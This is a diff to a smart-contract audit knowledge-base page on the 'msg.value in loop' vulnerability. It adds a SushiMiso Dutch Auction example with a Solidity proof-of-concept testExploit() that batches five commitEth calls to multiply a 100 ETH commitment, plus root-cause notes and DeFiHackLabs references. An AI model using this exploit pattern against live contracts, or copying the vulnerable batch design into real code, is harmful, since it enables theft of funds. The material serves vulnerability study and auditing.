@@ -33,8 +33,8 @@ tags:
   - DeFiHackLabs
 
 source: DeFiHackLabs
-total_exploits_analyzed: 1
-total_losses: "$371K"
+total_exploits_analyzed: 2
+total_losses: "$371K + $3M saved"
 ---
 
 ## msg.value in Loop Vulnerability
@@ -128,7 +128,50 @@ function testExploit() public {
 
 #### Category 2: msg.value in Multicall / Batch [HIGH]
 
-**Example 2: Generic Multicall msg.value Double-Spend** [HIGH]
+**Example 2: SushiMiso — Dutch Auction batch() ETH Commitment Multiplication (2021-09, ~$3M saved by whitehat)** [CRITICAL]
+```solidity
+// ❌ VULNERABLE: SushiMiso DutchAuction batch() forwards msg.value to each sub-call
+// @PoC: DeFiHackLabs/src/test/2021-09/Sushimiso_exp.sol
+interface IDutchAuction {
+    function commitEth(
+        address payable _beneficiary,
+        bool readAndAgreedToMarketParticipationAgreement
+    ) external payable;
+
+    function batch(
+        bytes[] calldata calls,
+        bool revertOnFail
+    ) external payable returns (bool[] memory successes, bytes[] memory results);
+}
+
+// @audit The batch() function internally delegatecalls commitEth() for each element
+// Each delegatecall sees the FULL msg.value — so 100 ETH sent once
+// gets credited 5 times (5 batch elements × 100 ETH = 500 ETH commitment)
+
+// Attack execution:
+function testExploit() public {
+    bytes memory payload = abi.encodePacked(
+        DutchAuction.commitEth.selector,
+        uint256(uint160(address(this))),
+        uint256(uint8(0x01))
+    );
+
+    bytes[] memory data = new bytes[](5);
+    data[0] = payload;
+    data[1] = payload;
+    data[2] = payload;
+    data[3] = payload;
+    data[4] = payload;
+
+    // @audit Send 100 ETH, but commitEth() is called 5 times with msg.value=100 ETH each
+    // Result: 500 ETH worth of auction commitment for only 100 ETH
+    DutchAuction.batch{value: 100 ether}(data, true);
+}
+```
+- **PoC**: `DeFiHackLabs/src/test/2021-09/Sushimiso_exp.sol`
+- **Root Cause**: SushiMiso's `batch()` function uses `delegatecall` internally. Each `commitEth()` sub-call sees the full `msg.value`, so the attacker's ETH commitment is multiplied by the number of batch elements. A whitehat rescued ~$3M by frontrunning the attacker.
+
+**Example 3: Generic Multicall msg.value Double-Spend** [HIGH]
 ```solidity
 // ❌ VULNERABLE: Multicall forwards msg.value to each sub-call
 contract VulnerableMulticall {
@@ -304,12 +347,14 @@ grep -rn "require.*msg.value" --include="*.sol"
 | Protocol | Date | Loss | Attack Vector | Chain |
 |----------|------|------|---------------|-------|
 | Opyn Protocol | 2020-08 | $371K | exercise() iterates vaults, checks msg.value per vault | Ethereum |
+| SushiMiso | 2021-09 | ~$3M (saved) | batch() delegatecalls commitEth() with reused msg.value | Ethereum |
 
 ---
 
 ### DeFiHackLabs PoC References
 
 - **Opyn Protocol** (2020-08, $371K): `DeFiHackLabs/src/test/2020-08/Opyn_exp.sol`
+- **SushiMiso** (2021-09, ~$3M saved): `DeFiHackLabs/src/test/2021-09/Sushimiso_exp.sol`
 
 ---
 
@@ -324,6 +369,10 @@ grep -rn "require.*msg.value" --include="*.sol"
 - payment_loop
 - exercise_loop
 - opyn
+- sushimiso
+- dutch_auction
+- commitEth
+- batch_delegatecall
 - payable_loop
 - eth_payment_reuse
 - DeFiHackLabs
